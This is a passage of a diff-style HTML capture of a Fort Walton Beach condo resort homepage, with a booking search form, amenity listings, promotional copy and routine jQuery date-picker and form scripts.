function triggerPostRender() {            if ( postRenderFired ) {                return;            }            postRenderFired = true;            jQuery( document ).trigger( 'gform_post_render', [16, current_page] );            gform.utils.trigger( { event: 'gform/postRender', native: false, data: { formId: 16, currentPage: current_page } } );            gform.utils.trigger( { event: 'gform/post_render', native: false, data: { formId: 16, currentPage: current_page } } );            if ( visibilityTestDiv ) {                visibilityTestDiv.parentNode.removeChild( visibilityTestDiv );            }        }        function debounce( func, wait, immediate ) {            var timeout;            return function() {                var context = this, args = arguments;                var later = function() {                    timeout = null;                    if ( !immediate ) func.apply( context, args );                };                var callNow = immediate && !timeout;                clearTimeout( timeout );                timeout = setTimeout( later, wait );                if ( callNow ) func.apply( context, args );            };        }        const debouncedTriggerPostRender = debounce( function() {            triggerPostRender();        }, 200 );        if ( visibilityTestDiv && visibilityTestDiv.offsetParent === null ) {            const observer = new MutationObserver( ( mutations ) => {                mutations.forEach( ( mutation ) => {                    if ( mutation.type === 'attributes' && visibilityTestDiv.offsetParent !== null ) {                        debouncedTriggerPostRender();                        observer.disconnect();                    }                });            });            observer.observe( document.body, {                attributes: true,                childList: false,                subtree: true,                attributeFilter: [ 'style', 'class' ],            });        } else {            triggerPostRender();        }    } );} ); 
+/* ]]> */
+</script>
+	</div>
+</div>
+	
+	
+    <section id="slider">
+        <div class="home-banner">
+                                <img id="defVidImg" class="video-poster" src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/05/Screenshot-2023-05-15-133020.png" alt="" title=""/>
+                    <span id="videoSource" style="display: none;">https://www.breakersfwb.com/wp-content/uploads/2023/05/Untitled-video-Made-with-Clipchamp-5-1.mp4</span>
+                            <img class="mobileImg" src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/03/Book-the-Best-Fort-Walton-Beach-Condos.png" alt="Fort Walton Beach Condos" title="Fort Walton Beach Condos"/>         
+        </div><!--End home-banner-->
+        <div class="container-fluid videoSearch">
+            <h1>The Breakers
+			 <span class="sub_title">Book the top Fort Walton Beach Vacation Rentals Today</span>
+            </h1>
+            <div class="container">
+                <div class="row">                      
+                    <div  class="c-search-widget search_widget "> 
+            <form method="post" class="form " id="resortpro-widget-form" action="https://www.breakersfwb.com/search-fort-walton-condos/" >
+        <input type="hidden" name="resortpro_search_nonce" value="c58fe21695"/>
+        <input type="hidden" class="disabled" id="resortpro_calendar_flex" name="resortpro_calendar_flex" value=""/>
+                                                                        <div class="row">
+            <div class="col-md-12">
+                <div class="row">
+                    <div class="col-xs-12">
+                        <h2 class="widgettitle"> </h2>
+                    </div>
+                </div>
+            </div>
+        </div>
+                <div class="row c-search-widget__fields">
+            <div class="customView">
+    <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 item">
+        <div class="form-group  resortpro-search-guests-adults-block">
+            <div class="c-select-list form-control"><select  name="streamlinecore_sw_bedrooms_number" id="streamlinecore_sw_bedrooms_number"  class=""><option value="">Bedrooms</option><option value="1">1 Bedroom</option><option value="2">2 Bedroom</option><option value="3">3 Bedroom</option></select></div>
+            <span class="caret"></span>                   
+        </div>
+    </div>
+    <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 item">
+        <div class="form-group has-feedback resortpro-search-checkin-block">
+           <div class="c-input-group date-group">
+                          <div class="date-arrows wdsearch">
+                            <span class="prevDayDate"><i class="fa fa-angle-left" aria-hidden="true"></i></span>
+                            <span class="nextDayDate"><i class="fa fa-angle-right" aria-hidden="true"></i></span>
+                          </div>
+                        <span id="monthsLimit" style="display:none" data-timezone="+00:00"></span><input id="search_start_date" ng-model="search.start_date" data-min-stay="1" data-max-stay="27"  data-turndates="" data-bindpicker="#search_end_date" class="form-control datepicker-input" type="text" name="start_date" readonly="readonly" placeholder="Arrival" data-turnDay="" value="" /><i class="glyphicon glyphicon-calendar"></i></div>
+           <span class="iconCalendar"><img src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/images/iconCalendar.svg" title="" alt=""/></span>
+        </div>
+    </div>
+    <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 item">
+        <div class="form-group has-feedback resortpro-search-checkout-block">
+            <div class="c-input-group date-group">
+                            <div class="date-arrows wdsearch">
+                              <span class="prevDayDate"><i class="fa fa-angle-left" aria-hidden="true"></i></span>
+                              <span class="nextDayDate"><i class="fa fa-angle-right" aria-hidden="true"></i></span>
+                            </div>
+                          <input id="search_end_date" ng-model="search.end_date" data-turndates="" class="form-control datepicker-input" type="text" name="end_date" readonly="readonly" placeholder="Departure" value="" /><i class="glyphicon glyphicon-calendar"></i></div>
+            <span class="iconCalendar"><img src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/images/iconCalendar.svg" title="" alt=""/></span>
+        </div>
+    </div>
+    <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 item">
+        <div class="form-group has-feedback guests-item">
+            <div class="c-select-list form-control"><select  name="streamlinecore_fw_adults" id="streamlinecore_fw_adults"  class=""><option value="">Guests</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option></select></div>
+            <span class="caret"></span>  
+        </div>
+    </div>
+    <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12 item">
+        <div class="form-group  resortpro-search-submit-button-block">
+            <button class="btn" type="submit">SEARCH!</button>
+        </div>
+    </div>
+    <div class="hidden">
+        <div class="form-group  resortpro-search-sorting-order-block"><input type="hidden" name="resortpro_sw_filter" value="random"></div>
+        </div>
+</div><!--End Custom View-->        </div>
+            </form>
+        </div>                </div>
+            </div>
+        </div><!--End videoSearch-->
+    </section><!--End Slider-->
+    <section class="bedrooms">
+        <div class="bedroomsBlock">
+            <!--<div class="box">
+                <a href="/our-fort-walton-beach-resort-rentals/one-bedroom/" class="item"> 
+                    <img src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/images/1bedroom.png" title="1 Bedroom condos for rent in Fort Walton Beach, FL" alt="1 bed Breakers Fort Walton rentals"/>                        
+                    <div class="wrap">1<span>Bedroom</span></div>                        
+                </a>  
+            </div>   
+            <div class="box">
+                <a href="/two-bedroom/" class="item">
+                    <img src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/images/2bedroom.png" title="2 Bedroom condos in Fort Walton Beach, FL" alt="Breakers Ft Walton condo rentals"/>
+                    <div class="wrap">2<span>Bedroom</span></div> 
+                </a>  
+            </div> 
+            <div class="box">
+                <a href="/three-bedroom/" class="item">
+                    <img src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/images/3bedroom.png" title="3 Bedroom Fort Walton Beach condo rentals" alt="Breakers Ft Walton condos"/>
+                    <div class="wrap">3<span>Bedroom</span></div>
+                </a>  
+            </div>   
+            <div class="box events">
+                <a href="/host-your-event/" class="item wedding">
+                    <img src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/images/hp-circle-events.jpg" title="Events" alt="Breakers Fort Walton"/>
+                    <div class="wrap"><span>Events</span></div>
+                </a>  
+            </div>-->
+            
+            <div class="box">
+                <a href="/our-fort-walton-beach-resort-rentals/one-bedroom/" class="item"> 
+                    <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2024/06/C405-Living-Room-3.jpg" title="Fort Walton Condos" alt="1 bed Breakers Fort Walton rentals"/>                        
+                    <div class="wrap">1<span>Bedroom</span>
+                        <span>1.5 Bath</span>
+                    </div>                        
+                </a>  
+            </div>   
+            <div class="box">
+                <a href="/2-bed-2-bath-standard-rentals/" class="item">
+                    <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2024/06/C311-Dining-Room-1.jpg" title="2 Bedroom condos in Fort Walton Beach, FL" alt="Breakers Ft Walton condo rentals"/>
+                    <div class="wrap">2<span>Bedroom</span>
+                        <span>2 Bath Standard</span>
+                    </div> 
+                </a>  
+            </div> 
+            <div class="box">
+                <a href="/2-bed-2-bath-deluxe-rentals/" class="item">
+                    <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2024/06/381-Santa-Rosa-Blvd-W308-Okaloosa-Island-FL-32548-USA-016-011-0L7A1661-MLS_Size.jpg" title="3 Bedroom Fort Walton Beach condo rentals" alt="Fort Walton Condos"/>
+                    <div class="wrap">2<span>Bedroom</span>
+                        <span>2 Bath Deluxe</span>
+                    </div>
+                </a>  
+            </div>   
+            <div class="box">
+                <a href="/3-bed-2-bath-rentals/" class="item">
+                    <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2024/06/381-Santa-Rosa-Blvd-W607-Okaloosa-Island-FL-32548-USA-019-034-DSC07514-MLS_Size.jpg" title="3 Bedroom Fort Walton Beach condo rentals" alt="Fort Walton Condos"/>
+                    <div class="wrap">3<span>Bedroom</span>
+                        <span>2 Bath</span>
+                    </div>
+                </a>  
+            </div>
+            <div class="box">
+                <a href="/3-bath-3-bedroom-condos-in-fort-walton-beach/" class="item">
+                    <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2024/06/C601-Living-Room-2.jpg" title="2 Bedroom condos in Fort Walton Beach, FL" alt="Breakers Ft Walton condo rentals"/>
+                    <div class="wrap">3<span>Bedroom</span>
+                        <span> 3 Bath</span>
+                    </div> 
+                </a>  
+            </div>   
+            <div class="box events">
+                <a href="/host-your-event/" class="item wedding">
+                    <img src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/images/hp-circle-events.jpg" title="Fort Walton Condos" alt="Fort Walton Condos"/>
+                    <div class="wrap"><span>Events</span></div>
+                </a>  
+            </div>
+        </div>
+    </section><!--End bedrooms-->
+    <section class="welcome-sect">
+        <div class="container">
+            <div class="row">
+                <article>
+                    <h2>Welcome to the Breakers</h2>
+					<p>Welcome to your home away from home at the best <strong>Fort Walton Beach resorts</strong>. Enjoy all the comforts of home, with the convenience of a hotel stay; choose from a comfortable one, two, or three-bedroom Fort Walton Beach condos with fully equipped, uniquely decorated floor plans. Our homes pair luxury amenities with close proximity to the best the area has to offer, making it the perfect choice for any vacation. There is no better way to experience Fort Walton Beach!</p>
+					<p>We offer first class personal services with the convenience of fully-equipped Fort Walton condos. The whole family will enjoy the beautiful Gulf Coast when you choose Fort Walton Beach resorts and Okaloosa Island as your vacation destination. The Breakers of Fort Walton Beach ensures that your stay will be one you and your family will never forget.</p>
+                 </article> 
+                 <article class="bigArticle">
+					<h2>Why Choose The Breakers?</h2>
+
+					<p>We understand you have lots of choices for accommodations during your stay in fabulous Fort Walton Beach, but once you take a look at our spacious and welcoming Fort Walton Beach condos, you’ll understand that we are simply the best choice! Our Fort Walton Beach rentals work for today’s travelers, as they supply everything needed to enjoy a once in a lifetime getaway. We also offer weekly and monthly rentals in Ft. Walton Beach, FL, for anyone looking to get away from the city!</p>
+
+					<p>Our fully equipped kitchens allow guests to cut back on dining out costs or just to reheat leftovers and whip up some tropical drinks in the blenders provided in every unit. The dining areas with enough seats for the entire family, and the living areas offer state-of-the-art electronics and comfy furniture on which to relax. You’ll have a great view of both the TV and the <a href="/condo-rentals-with-an-ocean-view/">views of the Gulf</a> just outside!</p>
+
+					<p>The bedrooms, whether you choose to rent the 1-, 2-, or <a href="/our-fort-walton-beach-resort-rentals/Three-Bedroom/">3-bedroom</a> Fort Walton Condos, are spacious and bright when you need them to be! Drawing the drapes before sinking into our soft beds every night is a wise choice if you feel the need to sleep late into the next morning! Some of our larger units offer balconies off one of the bedrooms as well as off the living area, giving travelers the perfect spot to enjoy a morning coffee or one last glimpse of the sunrise before heading out on the town. And lastly, the 1-, 2-, and 3-bathroom units offer a spacious spot to get ready each morning without worrying about crowding your fellow travelers!</p>
+
+					<p>Each of our Fort Walton condos are independently designed, but many come with upgraded countertops, custom cabinetry, and stylish tiled tub/shower combinations that offer a pleasant way to start each day. Staying with us allows access to all the community amenities as well, ensuring that each and every day of your vacation will be filled with fun and excitement. It’s possible you could find some of our many amenities somewhere else, but when you combine them with the uniquely decorated styles we offer, you know that The Breakers is the only place you will want to stay! If you want to stay in our gorgeous <a href="/our-fort-walton-beach-resort-rentals/our-fort-walton-beachfront-condos/">Fort Walton Gulf front condos</a>, just moments from Destin, Florida, let <a href="/about-us/" target="_blank">The Breakers of Fort Walton Beach</a> help you have the vacation of a lifetime. Contact us today to book your dream vacation at the best Fort Walton Resort!</p>
+                    
+                </article>
+                <div class="clear"></div>
+                <div class="readMore">Read More</div>
+                              
+            </div><!-- end row -->
+        </div><!-- end container -->
+    </section><!-- end welcome-sect -->
+	<!--<div><center><a href="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2020/06/Healthcare-Heros.pdf"><img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2020/06/Heroes20-Image-new.png"></a><a href="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2020/11/Holiday-Promo-2.jpg" target="_blank"><img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2020/11/Holiday-Image-new-2.jpg" style="margin-left:10px;"></a></center>-->
+<!-- 	</div>&nbsp; -->
+	<div>
+	</div>&nbsp;
+    <section class="amenities-sect">       
+        <div class="item1">
+            <div class="amenities-item">
+                <a href="/experience/pools/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/03/Pool-access-at-the-Top-Fort-Walton-Beach-Resorts.jpeg" title="Fort Walton resort rentals with pool access" alt="The Breakers Fort Walton resort with pool"/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Pools</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Sunbath, swim or just relax around the fantastic pool.</p>
+                        </div>
+                    </div>
+                </a>                        
+            </div>
+        </div><!--end item1-->
+        <div class="item1">
+            <div class="amenities-item">
+                <a href="/merchandise/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2025/04/Redshirt3.png" title="Discover fresh Breakers gear with beach-ready style – perfect for locals, visitors, and anyone who loves the coast." alt="Breakers merchandise available now."/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Merchandise</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Fresh gear, beach-ready style – browse our merch!</p>
+						</div>                             
+                    </div>
+                </a>
+            </div>
+        </div><!--end item1-->
+        <div class="item1">
+            <div class="amenities-item">
+                <a href="/experience/tennis-pickleball/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2022/11/6_The-Breakers-Amenities_20220517_225-scaled.jpg" title="Spend some time playing in our regulation-lighted courts, surrounded by tropical palm trees." alt="Tennis & Pickleball at our Ft Walton Rentals"/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Tennis & Pickleball</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Hoping to practice your swing in the ocean breezes?</p>
+                        </div>
+                    </div>
+                </a>
+            </div>
+        </div><!--end item1-->
+        <div class="item1">
+            <div class="amenities-item">
+                <a href="/experience/frontdesk/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/03/The-Guest-Service-Desk-at-our-Fort-Walton-Beach-Resort.jpeg" title="Enjoy front desk services from our condos in Fort Walton, Florida" alt="Our Fort Walton Beach condos have front desk services"/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Guest Services Desk</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Front Desk Staff are available 7AM-11PM daily.</p>
+                        </div>
+                    </div>
+                </a>
+            </div>
+        </div><!--end item1-->
+        
+        <div class="item1">
+            <div class="amenities-item">
+                <a href="/host-your-event/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/03/The-Event-Room-at-our-Fort-Walton-Resort.png" title="Available event rooms at our Fort Walton resort" alt="Book your event in our Fort Walton resort"/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Event Room</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Enjoy privacy when you host an event</p>
+                        </div>
+                    </div>
+                </a>
+            </div>
+        </div><!--end item1-->
+        <div class="item1">
+            <div class="amenities-item">
+                <a href="/why-choose-the-breakers-for-fort-walton-weddings/wedding/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2022/12/msg681493315-264694.jpg" title="Weddings at our Fort Walton resort are beautiful" alt="Fort Walton Beach condo rentals for a Florida wedding"/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Weddings & Reception</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Tie the knot in the most beautiful place in the world</p>
+                        </div>
+                    </div>
+                </a>
+            </div>
+        </div><!--end item1-->
+        <div class="item1">
+            <div class="amenities-item">
+                <a href="/live-beach-cam/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2022/12/msg681493315-264698.jpg" title="Beautiful views at our Fort Walton Beach condo rentals" alt="Fort Walton condos offer great views"/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Live Beach Cam</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Relax and take in the stunning views</p>
+                        </div>
+                    </div>
+				</a>
+            </div>
+        </div><!--end item1-->
+        <div class="item1">
+            <div class="amenities-item">
+                <a href="/fort-walton-beach-attractions/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2022/08/Fort-Walton-Beach-Labor-Day.jpg" title="Things to do near our Fort Walton Beach resort" alt="Fort Walton Beach resort things to do"/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Nearby Things to Do</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Check out all the exciting things to do around the area!</p>
+                        </div>
+                    </div>
+                </a>
+            </div>
+        </div><!--end item1-->
+		<div class="item1">
+            <div class="amenities-item">
+                <a href="/experience/fitness-center/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/06/29_The-Breakers-Amenities_20220517_125.jpg" title="This spacious gym includes a range of exercise machines, so you can keep up with your regular workouts while you’re away from home." alt="Fort Walton Beach resort fitness center"/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Fitness Center</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Run, walk, bike, lift weights, or stretch!</p>
+                        </div>
+                    </div>
+                </a>
+            </div>
+        </div><!--end item1-->
+		<div class="item1">
+            <div class="amenities-item">
+                <a href="/specials/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2018/05/web-beach-family.jpg" title="We offer a number of seasonal Fort Walton Beach specials and packages designed to fit your needs." alt="Fort Walton Beach resort specials"/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Specials</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Time Away at a Price You’ll Love!</p>
+                        </div>
+                    </div>
+                </a>
+            </div>
+        </div><!--end item1-->
+		<div class="item1">
+            <div class="amenities-item">
+                <a href="/about-us/reviews/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/01/Breakers_20230110_005.jpg" title="Don’t just trust us! See what our guests have to say.." alt="Fort Walton Beach resort reviews"/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Reviews</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Don’t just trust us! See what our guests have to say!</p>
+                        </div>
+                    </div>
+                </a>
+            </div>
+        </div><!--end item1-->
+		<div class="item1">
+            <div class="amenities-item">
+                <a href="/experience/spa-and-golf/">
+                    <div class="amenities-img">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2020/07/web-golf-1.jpg" title="Fort Walton Beach is more than just a beautiful spot on the Emerald Coast; it’s also a premier golfing destination!" alt="Fort Walton Beach resort golf"/>
+                    </div>                        
+                    <div class="amenities-title">
+                        <h3>Golf</h3>
+                    </div>
+                    <div class="amenities-desc">
+                        <div class="amenities-desc-item">
+                            <p>Year-round perfect weather and sunshine by the coast means prime Fort Walton Beach golf weather any time you can get away.</p>
+                        </div>
+                    </div>
+                </a>
+            </div>
+        </div><!--end item1-->
+    </section><!-- end amenities-sect -->
+    <section class="activities"><!-- activities -->
+    	<div class="flex">
+    		<div class="item">
+    			<h2>Complimentary<br>Activities</h2>
+    			<div class="box">
+					<p>Booking a stay at The Breakers of Fort Walton Beach resorts comes complete with a variety of complimentary activities.
+    			 Come aboard the Cattywampus and go snorkeling in Destin or search for dolphins, play 18-holes of golf at 3.5 star Shalimar Pointe.
+    			</p>
+    			</div>
+    			<a class="btn-complimentary-activities" href="/xplorieactivites">Learn More About Complementary Activities</a>
+    		</div>
+    		<div class="item">
+    			<h2>Fort Walton Condos Free Amenities</h2>
+    			<div class="box">
+    				<p>Enjoy all the free amenities that are included in each rental, including 2 pools, an exercise room and sauna, tennis courts, community grills, bocce ball, cornhole and shuffleboard courts. There are many more amenities to choose from, just click the link below to discover more.</p>
+    			</div>
+    			<a class="btn-free-amenitials" href="/experience/amenities/">Learn More About Free Amenities</a>
+    		</div>
+    	</div>
+    </section><!-- end activities -->
+</div><!--End Content-->
+<!--<link href="https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-0507/assets/dist/css/jquery-ui.min.css" rel="stylesheet" type="text/css">-->
+
+<!--<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">-->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">       
+<!--<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>-->
+<!--<script src="https://cdnjs.cloudflare.com/com/ajax/libs/jquery.sticky/1.0.3/jquery.sticky.min.js"></script>-->
+<script>var dateFormat=function(){var t=/d{1,4}|m{1,4}|yy(?:yy)?|([HhMsTt])\1?|[LloSZ]|"[^"]*"|'[^']*'/g,e=/\b(?:[PMCEA][SDP]T|(?:Pacific|Mountain|Central|Eastern|Atlantic) (?:Standard|Daylight|Prevailing) Time|(?:GMT|UTC)(?:[-+]\d{4})?)\b/g,a=/[^-+\dA-Z]/g,m=function(t,e){for(t=String(t),e=e||2;t.length<e;)t="0"+t;return t};return function(d,n,r){var y=dateFormat;if(1!=arguments.length||"[object String]"!=Object.prototype.toString.call(d)||/\d/.test(d)||(n=d,d=void 0),d=d?new Date(d):new Date,isNaN(d))throw SyntaxError("invalid date");n=String(y.masks[n]||n||y.masks["default"]),"UTC:"==n.slice(0,4)&&(n=n.slice(4),r=!0);var s=r?"getUTC":"get",i=d[s+"Date"](),o=d[s+"Day"](),u=d[s+"Month"](),M=d[s+"FullYear"](),l=d[s+"Hours"](),T=d[s+"Minutes"](),h=d[s+"Seconds"](),c=d[s+"Milliseconds"](),g=r?0:d.getTimezoneOffset(),S={d:i,dd:m(i),ddd:y.i18n.dayNames[o],dddd:y.i18n.dayNames[o+7],m:u+1,mm:m(u+1),mmm:y.i18n.monthNames[u],mmmm:y.i18n.monthNames[u+12],yy:String(M).slice(2),yyyy:M,h:l%12||12,hh:m(l%12||12),H:l,HH:m(l),M:T,MM:m(T),s:h,ss:m(h),l:m(c,3),L:m(c>99?Math.round(c/10):c),t:12>l?"a":"p",tt:12>l?"am":"pm",T:12>l?"A":"P",TT:12>l?"AM":"PM",Z:r?"UTC":(String(d).match(e)||[""]).pop().replace(a,""),o:(g>0?"-":"+")+m(100*Math.floor(Math.abs(g)/60)+Math.abs(g)%60,4),S:["th","st","nd","rd"][i%10>3?0:(i%100-i%10!=10)*i%10]};return n.replace(t,function(t){return t in S?S[t]:t.slice(1,t.length-1)})}}();dateFormat.masks={"default":"ddd mmm dd yyyy HH:MM:ss",shortDate:"m/d/yy",mediumDate:"mmm d, yyyy",longDate:"mmmm d, yyyy",fullDate:"dddd, mmmm d, yyyy",shortTime:"h:MM TT",mediumTime:"h:MM:ss TT",longTime:"h:MM:ss TT Z",isoDate:"yyyy-mm-dd",isoTime:"HH:MM:ss",isoDateTime:"yyyy-mm-dd'T'HH:MM:ss",isoUtcDateTime:"UTC:yyyy-mm-dd'T'HH:MM:ss'Z'"},dateFormat.i18n={dayNames:["Sun","Mon","Tue","Wed","Thu","Fri","Sat","Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],monthNames:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec","January","February","March","April","May","June","July","August","September","October","November","December"]},Date.prototype.format=function(t,e){return dateFormat(this,t,e)};</script>
+<script>function add_tooltip(){jQuery(".available").tooltipster({interactive:!0,multiple:!0})}function run_waitMe(container,effect,message){message=void 0!==message?message:"Please wait ...",effect=void 0!==effect?effect:"bounce",jQuery(container).waitMe({effect:effect,text:message,bg:"rgba(255,255,255,0.7)",color:"#000",sizeW:"",sizeH:"",source:"img.svg"})}function hide_waitMe(container){jQuery(container).waitMe("hide")}!function($){$.fn.stars=function(){return $(this).each(function(){var val=parseFloat($(this).html()),size=16*Math.max(0,Math.min(5,val)),$span=$("<span />").width(size);$(this).html($span)})},$(document).ready(function(){jQuery().tooltip&&$("body").tooltip({selector:".btn-fav, .petFriendly"}),$(".btn-sort").click(function(){$(".btn-sort").removeClass("active"),$(this).addClass("active")}),$("span.rating").stars();var checkin_days=0;isNaN($(".datepicker").attr("data-checkin-days"))||(checkin_days=$(".datepicker").attr("data-checkin-days")),$(".datepicker").datepicker({minDate:"+"+checkin_days+"d",dateFormat:"m/d/yy"}),$(".datepicker-end").datepicker({minDate:"+2d",dateFormat:"m/d/yy"}),$(".datepicker").change(function(){var frm=new Date(jQuery(this).val()),the_year=frm.getFullYear();the_year<2e3&&(the_year=2e3+the_year%100);var nts=1;$("#resortpro_min_days").attr("value")&&($nts=parseInt(jQuery("#resortpro_min_days").attr("value")));var endpicker=$(this).attr("data-bindpicker");if(endpicker&&0!==endpicker.length){$(endpicker).datepicker("option","minDate",to),$(this).attr("data-min-stay")&&(nts=parseInt(jQuery(this).attr("data-min-stay")));var to=new Date(the_year,frm.getMonth(),frm.getDate()+nts);$(endpicker).datepicker("option","minDate",to),$(endpicker).val(to.format("mm/dd/yyyy")),$(endpicker).trigger("input"),setTimeout(function(){$(endpicker).datepicker("show")},10)}}),$("#slider-range").slider({range:!0,min:0,max:500,values:[75,300],slide:function(event,ui){$("#amount").val("$"+ui.values[0]+" - $"+ui.values[1])}}),$("#amount").val("$"+$("#slider-range").slider("values",0)+" - $"+$("#slider-range").slider("values",1)),$("#collapseFilters").on("shown.bs.collapse",function(){$("#btn-collapse span").html("Hide filters")}),$("#collapseFilters").on("hidden.bs.collapse",function(){$("#btn-collapse span").html("Show more filters")}),$(".btn-price-breakdown").click(function(){return $(".breakdown-days-hidden").each(function(){0==$(this).data("visible")?($(this).css("display","table-row"),$(this).data("visible",!0),$(".btn-price-breakdown span").html("Hide Breakdown")):($(this).css("display","none"),$(this).data("visible",!1),$(".btn-price-breakdown span").html("View Breakdown"))}),!1}),$(".btn-taxes-breakdown").click(function(){return $(".breakdown-taxes-hidden").each(function(){0==$(this).data("visible")?($(this).css("display","table-row"),$(this).data("visible",!0),$(".btn-taxes-breakdown span").html("Hide Breakdown")):($(this).css("display","none"),$(this).data("visible",!1),$(".btn-taxes-breakdown span").html("View Breakdown"))}),!1}),$(".btn-fees-breakdown").click(function(){return $(".breakdown-fees-hidden").each(function(){0==$(this).data("visible")?($(this).css("display","table-row"),$(this).data("visible",!0),$(".btn-fees-breakdown span").html("Hide Breakdown")):($(this).css("display","none"),$(this).data("visible",!1),$(".btn-fees-breakdown span").html("View Breakdown"))}),!1})}),$(document).delegate('*[data-toggle="lightbox"]',"click",function(event){event.preventDefault(),$(this).ekkoLightbox()})}(jQuery);</script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/js/slick.js"></script>
+    <footer>
+    	<div class="container"> <!-- container -->
+    		<div class="row"><!-- row -->
+    			<div class="col-md-3 left-box"> <!-- col-md-3 -->
+    				<a href="https://www.breakersfwb.com/fort-walton-beach-resort-rentals/" class="logo-footer"><img src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/images/logo.png" style="width:230px;" title="Logo for The Breakers of Fort Walton Beach Vacation Rentals" alt="The Breakers of Fort Walton Beach Vacation Rentals - Logo"></a>
+                    <p class="first">The Breakers of Fort Walton Beach</p>
+					<p><a href="https://goo.gl/6dNqJx" target="_blank">381 Santa Rosa Boulevard</a></p>
+					<p>Fort Walton Beach, FL 32548</p>
+
+					<div><span>Phone:</span><a href="tel:8003954853">(800) 395-GULF (4853)</a></div>
+					<div><span>Email:</span><a href="mailto:info@breakersfwb.com">info@breakersfwb.com</a></div>
+					<a href="https://BIZCOR.com" target="_blank" rel="nofollow"><img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2018/10/developerbadge.png"title="Bizcor logo"alt="color logo of Bizcor Strategic Marketing" class="devbadge" style="padding-top:20px;"></a>
